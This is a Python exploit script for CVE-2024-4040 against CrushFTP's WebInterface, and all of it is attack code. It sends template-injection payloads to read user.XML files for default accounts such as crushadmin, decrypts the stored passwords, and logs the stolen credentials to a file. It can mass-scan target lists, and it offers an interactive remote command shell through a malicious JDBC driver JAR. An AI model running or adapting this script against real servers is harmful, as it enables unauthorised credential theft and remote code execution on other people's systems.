import requests
import argparse
import re
import urllib3
import subprocess
import base64
import urllib.parse

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))
headers = {}

def banner():
    banner = r'''
  / __\ \ / / __|_|_  )  \_  ) | | ___| | | /  \| | | /  \ 
 | (__ \ V /| _|___/ / () / /|_  _|___|_  _| () |_  _| () |
  \___| \_/ |___| /___\__/___| |_|      |_| \__/  |_| \__/ 
'''
    
    return banner

def shell(url, command, jar_path):
    data = "command=testDB&db_driver_file={}&db_driver=org.gjt.mm.mysql.Driver&db_url=jdbc%253Amysql%253A%252F%252F127.0.0.1%253A3306%252Fcrushftp%253FautoReconnect%253Dtrue&db_user={}&db_pass=&c2f={}".format(
        jar_path, 
        base64.b64encode(command.encode('utf-8')).decode('utf-8'), 
        re.search(r'currentAuth=([^;]+)', headers.get('Cookie', '')).group(1)
    )

    response = requests.post(url + "/WebInterface/function/", data=data, headers=headers, proxies={
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }, verify=False)
    result = urllib.parse.unquote(re.search(r'<commandResult><response>(.*?)</response></commandResult>', response.text).group(1))

    return result.replace("Error:java.sql.SQLException: Command execution failed: ", "")

def decryptPassword(url, account, cookies):
    data = {
        "command": "zip",
        "path": "<INCLUDE>users/MainUsers/{}/user.XML</INCLUDE>".format(account),
        "c2f": cookies['currentAuth'],
        "names":"/a"
    }

    response = requests.post(url + "/WebInterface/function/", data=data, cookies=cookies, headers=headers, proxies={
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }, verify=False)

    try:
        password = re.search(r"<password>(.*?)</password>", response.text).group(1)
        result = subprocess.run("javac decrypt.java && java decrypt '{}'".format(password), shell=True, capture_output=True, text=True)
    except:
        print("[-] Failed to decrypt password!")
        return "Password not found!"

    if result.returncode == 0:
        return result.stdout

def scan(url, account, output_file):
    print("Target:", url)
    print ("[+] Checking if the target is vulnerable..")

    try:
        response = requests.post(url + "/WebInterface/login.html", headers=headers, allow_redirects=False, proxies={
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }, verify=False, timeout=5)
    except:
        print("[-] Target is not vulnerable!")
        return 0

    cookies = response.cookies

    default_users = ["<INCLUDE>users/MainUsers/TempAccount/user.XML</INCLUDE>", 
                     "<INCLUDE>users/MainUsers/default/user.XML</INCLUDE>", 
                     "<INCLUDE>users/MainUsers/test/user.XML</INCLUDE>", 
                     "<INCLUDE>users/MainUsers/crushadmin/user.XML</INCLUDE>"]

    for default_user in default_users:
        try:
            data = {
                "command": "zip",
                "path": default_user,
                "c2f": cookies['currentAuth'],
                "names":"/a"
            }
        except:
            print("[-] Target is not vulnerable!")
            break

        try:
            response = requests.post(url + "/WebInterface/function/", data=data, cookies=cookies, headers=headers, proxies={
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
            }, verify=False, allow_redirects=False, timeout=5)
        except:
            print("[-] Target is not vulnerable!")
            break

        if response.status_code == 302:
            print("[-] Target is not vulnerable!")
            break

        if "<commandResult" in response.text and 'FAILURE' not in response.text: 
            print("[+] Target is Vulnerable!")
            password = decryptPassword(url, account, cookies)
            print("[+] Password is:", password)

            if output_file is not None:
                with open(output_file, "a") as f:
                    f.write("Target: {}, Account: {}, Password: {}\n".format(url, account, password))
            break

    else:
        print("[-] Target is not vulnerable!")

def main():
    def parse_headers(headers_string):
        headers_dict = {}
        headers = headers_string.split('\n')

        for header in headers:
            if ':' in header:
                key, value = header.split(':', 1)
                headers_dict[key.strip()] = value.strip()

        return headers_dict
    
    parser = argparse.ArgumentParser(description="CVE-2024-4040")
    parser.add_argument("-u", '--url', required=False, help="The target URL")
    parser.add_argument("-H", "--headers", required=False, help="Headers", type=str)
    parser.add_argument("--account", required=False, help="The target account", default="crushadmin")
    parser.add_argument("--shell", required=False, action="store_true")
    parser.add_argument("--jar-path", required=False, help="Jar file path", default="/tmp/mysql_cmd_db_user_final_with_echo_base64.jar")
    parser.add_argument("--list", required=False, help="Target list")
    parser.add_argument("--output-file", required=False, help="The result will be output to the specified file", default=None)
    args = parser.parse_args()

    global headers
    if args.headers:
        headers = parse_headers(args.headers)

    print(banner())

    if args.shell:
        print("[!] Remember to bring the currentAuth and CrushAuth cookie values after logging in.\n")
        while True:
            command = input("{}:{}$ ".format(args.url, args.account))

            if command.lower() == "exit":
                break

            result = shell(args.url, command, args.jar_path)
            print(result)

    elif args.list != None:
        with open(args.list, 'r') as urls:
            for line in urls:
                parsed_url = urllib.parse.urlparse(line)
                url = f'{parsed_url.scheme}://{parsed_url.netloc}'
                scan(url, args.account, args.output_file)

    else: 
        parsed_url = urllib.parse.urlparse(args.url)
        url = f'{parsed_url.scheme}://{parsed_url.netloc}'
        scan(url, args.account, args.output_file)
        
if __name__ == "__main__":
    main()